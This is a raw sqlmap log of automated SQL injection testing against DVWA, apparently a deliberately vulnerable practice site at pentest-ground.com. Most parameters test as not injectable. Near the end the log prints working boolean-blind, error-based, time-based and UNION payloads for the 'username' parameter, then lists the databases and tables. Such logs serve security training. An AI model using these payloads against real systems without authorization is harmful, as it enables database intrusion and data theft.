[10:56:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:56:39] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:56:41] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:56:44] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:56:47] [INFO] testing 'Generic inline queries'
[10:56:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:56:50] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:56:52] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:56:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:56:57] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:56:59] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:57:02] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[10:57:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:57:07] [WARNING] POST parameter 'step' does not seem to be injectable
[10:57:07] [INFO] testing if POST parameter 'password_new' is dynamic
[10:57:07] [WARNING] POST parameter 'password_new' does not appear to be dynamic
[10:57:08] [WARNING] heuristic (basic) test shows that POST parameter 'password_new' might not be injectable
[10:57:09] [INFO] testing for SQL injection on POST parameter 'password_new'
[10:57:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:57:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:57:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:57:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:57:18] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:57:22] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:57:25] [INFO] testing 'Generic inline queries'
[10:57:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:57:27] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:57:29] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:57:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:57:35] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:57:38] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:57:41] [INFO] testing 'Oracle AND time-based blind'
[10:57:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:57:50] [WARNING] POST parameter 'password_new' does not seem to be injectable
[10:57:50] [INFO] testing if POST parameter 'password_conf' is dynamic
[10:57:51] [WARNING] POST parameter 'password_conf' does not appear to be dynamic
[10:57:51] [WARNING] heuristic (basic) test shows that POST parameter 'password_conf' might not be injectable
[10:57:52] [INFO] testing for SQL injection on POST parameter 'password_conf'
[10:57:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:57:55] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:57:55] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:57:59] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:58:02] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:58:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:58:11] [INFO] testing 'Generic inline queries'
[10:58:12] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:58:15] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:58:18] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:58:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:58:25] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:58:27] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:58:30] [INFO] testing 'Oracle AND time-based blind'
[10:58:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:58:39] [WARNING] POST parameter 'password_conf' does not seem to be injectable
[10:58:39] [INFO] testing if POST parameter 'Change' is dynamic
[10:58:40] [WARNING] POST parameter 'Change' does not appear to be dynamic
[10:58:40] [WARNING] heuristic (basic) test shows that POST parameter 'Change' might not be injectable
[10:58:41] [INFO] testing for SQL injection on POST parameter 'Change'
[10:58:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:58:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:58:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:58:47] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:58:49] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:58:52] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:58:55] [INFO] testing 'Generic inline queries'
[10:58:55] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:58:57] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:58:59] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:59:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:59:05] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:59:08] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:59:11] [INFO] testing 'Oracle AND time-based blind'
[10:59:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:59:19] [WARNING] POST parameter 'Change' does not seem to be injectable
[10:59:19] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[9/16] Form:
POST https://pentest-ground.com:4280/vulnerabilities/javascript/
POST data: token=&phrase=ChangeMe&send=Submit
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: token=&phrase=ChangeMe&send=Submit] (Warning: blank fields detected): token=&phrase=ChangeMe&send=Submit
do you want to fill blank fields with random values? [Y/n] Y
POST parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
you have not declared cookie(s), while server wants to set its own ('security=low;PHPSESSID=d3c07b28e1f...6f008b62a3'). Do you want to use those [Y/n] Y
[10:59:20] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:59:21] [INFO] testing if the target URL content is stable
[10:59:21] [INFO] target URL content is stable
[10:59:21] [INFO] ignoring POST parameter 'token'
[10:59:21] [INFO] testing if POST parameter 'phrase' is dynamic
[10:59:22] [WARNING] POST parameter 'phrase' does not appear to be dynamic
[10:59:22] [WARNING] heuristic (basic) test shows that POST parameter 'phrase' might not be injectable
[10:59:23] [INFO] testing for SQL injection on POST parameter 'phrase'
[10:59:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:59:26] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:59:26] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:59:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:59:31] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:59:34] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:59:36] [INFO] testing 'Generic inline queries'
[10:59:37] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:59:39] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:59:41] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:59:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:59:46] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:59:48] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:59:51] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[10:59:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[11:00:00] [WARNING] POST parameter 'phrase' does not seem to be injectable
[11:00:00] [INFO] testing if POST parameter 'send' is dynamic
[11:00:00] [WARNING] POST parameter 'send' does not appear to be dynamic
[11:00:00] [WARNING] heuristic (basic) test shows that POST parameter 'send' might not be injectable
[11:00:01] [INFO] testing for SQL injection on POST parameter 'send'
[11:00:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:00:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[11:00:04] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[11:00:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[11:00:09] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[11:00:11] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[11:00:14] [INFO] testing 'Generic inline queries'
[11:00:14] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[11:00:16] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[11:00:19] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[11:00:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[11:00:23] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[11:00:25] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[11:00:27] [INFO] testing 'Oracle AND time-based blind'
[11:00:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[11:00:34] [WARNING] POST parameter 'send' does not seem to be injectable
[11:00:34] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[10/16] Form:
GET https://pentest-ground.com:4280/vulnerabilities/brute/?username=&password=&Login=Login
do you want to test this form? [Y/n/q] 
> Y
Edit GET data [default: username=&password=&Login=Login]: username=&password=&Login=Login
do you want to fill blank fields with random values? [Y/n] Y
[11:00:34] [INFO] resuming back-end DBMS 'mysql' 
you have not declared cookie(s), while server wants to set its own ('security=low;PHPSESSID=8b03323d23f...df117c8381'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=xEnT' RLIKE (SELECT (CASE WHEN (4907=4907) THEN 0x78456e54 ELSE 0x28 END))-- nLYM&password=NIgA&Login=Login

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=xEnT' AND (SELECT 9404 FROM(SELECT COUNT(*),CONCAT(0x71786b6271,(SELECT (ELT(9404=9404,1))),0x716b767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- yOLs&password=NIgA&Login=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=xEnT' AND (SELECT 9212 FROM (SELECT(SLEEP(5)))PqJv)-- jRhG&password=NIgA&Login=Login

    Type: UNION query
    Title: MySQL UNION query (NULL) - 8 columns
    Payload: username=xEnT' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786b6271,0x58645a4270766a596b5865494c6b6f6c4141497a466570687a4f776c6d6964726a4a7861736c4c6d,0x716b767a71),NULL,NULL#&password=NIgA&Login=Login
---
do you want to exploit this SQL injection? [Y/n] Y
[11:00:34] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.3.7, Nginx 1.25.5
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[11:00:34] [INFO] fetching database names
available databases [2]:
[*] dvwa
[*] information_schema

[11:00:34] [INFO] fetching tables for databases: 'dvwa, information_schema'
Database: information_schema
[79 tables]
+---------------------------------------+
| ALL_PLUGINS                           |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| CHECK_CONSTRAINTS                     |
| CLIENT_STATISTICS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |
| FILES                                 |
| GEOMETRY_COLUMNS                      |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INDEX_STATISTICS                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_METRICS                        |
| INNODB_SYS_COLUMNS                    |
| INNODB_SYS_FIELDS                     |
| INNODB_SYS_FOREIGN                    |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_SYS_INDEXES                    |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_TABLESPACES                |
| INNODB_SYS_TABLESTATS                 |
| INNODB_SYS_VIRTUAL                    |
| INNODB_TABLESPACES_ENCRYPTION         |
| INNODB_TRX                            |
| KEYWORDS                              |
| KEY_CACHES                            |
| KEY_COLUMN_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| SPATIAL_REF_SYS                       |
| SQL_FUNCTIONS                         |
| STATISTICS                            |
| SYSTEM_VARIABLES                      |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TABLE_STATISTICS                      |
| THREAD_POOL_GROUPS                    |
| THREAD_POOL_QUEUES                    |
| THREAD_POOL_STATS                     |
| THREAD_POOL_WAITS                     |
| USER_PRIVILEGES                       |
| USER_STATISTICS                       |
| VIEWS                                 |
| COLUMNS                               |
| ENGINES                               |
| EVENTS                                |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| TABLES                                |
| TRIGGERS                              |
| user_variables                        |
+---------------------------------------+

Database: dvwa
[2 tables]
+---------------------------------------+
| guestbook                             |
| users                                 |
+---------------------------------------+

SQL injection vulnerability has already been detected against 'pentest-ground.com'. Do you want to skip further tests involving it? [Y/n] Y
[11:00:34] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/csp/'
[11:00:34] [INFO] skipping 'https://pentest-ground.com:4280/setup.php'
[11:00:34] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/xss_d/?default=" %2B lang %2B "'
[11:00:34] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/fi/?page=include.php'
[11:00:34] [INFO] skipping 'https://pentest-ground.com:4280/vulnerabilities/open_redirect/source/low.php?redirect=info.php?id=1'
[11:00:34] [INFO] skipping 'https://pentest-ground.com:4280/instructions.php?doc=readme'
[11:00:34] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/Users/mahdihussnie/.local/share/sqlmap/output/results-05142024_1040am.csv'

[*] ending @ 11:00:34 /2024-05-14/

